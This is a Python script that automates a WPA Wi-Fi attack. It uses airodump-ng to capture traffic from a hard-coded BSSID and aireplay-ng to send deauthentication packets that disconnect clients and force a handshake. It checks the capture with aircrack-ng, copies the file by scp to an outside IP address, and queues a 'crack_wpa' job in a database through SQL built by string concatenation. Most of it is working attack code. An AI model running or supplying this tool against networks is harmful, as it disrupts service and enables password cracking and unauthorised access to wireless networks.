#!/usr/bin/python

import subprocess
import os
from monitor_management import *
from signal import SIGINT
import time
from database import *
import shutil

def capture(channel, BSSID, interface):
	command=["sudo","airodump-ng","-c"]
	command.append(str(channel))
	command.append("--bssid")
	command.append(BSSID)
	command.append("-w")
	command.append("/home/isis/psk/psk")
	command.append(interface)
	DN=open (os.devnull, "w")
	proc_airodump= subprocess.Popen(command, stdout=DN, stderr=DN)
	send_deauth(BSSID, interface)
	check_routine(BSSID, proc_airodump)
	

def check_routine (BSSID, proc_airodump):
	time.sleep(10)
	gelukt= check_capture(BSSID)
	if not gelukt:
		check_routine(BSSID, proc_airodump)
	else:
		print ("gelukt")
		filename="/home/isis/psk/"
		time=str(time.time())
		filename+=time
		filename+=".cap"
		os.rename("/home/isis/psk/psk-01.cap", filename)
		command="scp "
		command+=filename
		command+=" isis@193.191.187.44:."
		os.system(command)
		os.kill(proc_airodump.pid, SIGINT)

def hand_assignment(BSSID, ESSID):
	query= "insert into assignments (assignment, status, caption, parameter) values ('crack_wpa', 'new', 'isis-OptiPlex-755', '"
	query+=BSSID
	query+="|"
	query+=ESSID
	query+="');"
	print (query)
	executequery(query)


def send_deauth(BSSID, interface):
	command="sudo aireplay-ng -0 5 -a "
	command+=BSSID
	command+=" "
	command+=interface
	os.system(command)

def check_capture(BSSID):
	uit=True
	command=["sudo", "aircrack-ng","-b"]
	command.append(BSSID)
	command.append("/home/isis/psk/psk-01.cap")
	DN= open(os.devnull, "w")
	output= subprocess.check_output(command, stderr=DN)
	if "No valid WPA handshakes found" in output or "Got no data packets from target network" in output:
		uit= False
	return uit

def cleanup():
	shutil.rmtree("/home/isis/psk")


def automated(BSSID, channel, ESSID):
	os.makedirs("/home/isis/psk")
	interface= start_monitor("wlan0", channel)
	capture(channel, BSSID, interface)
	hand_assignment(BSSID, ESSID)
	stop_monitor(interface)
	cleanup()

if __name__ == '__main__':
	automated("00:21:91:04:B9:25", 6, "airmon-ng")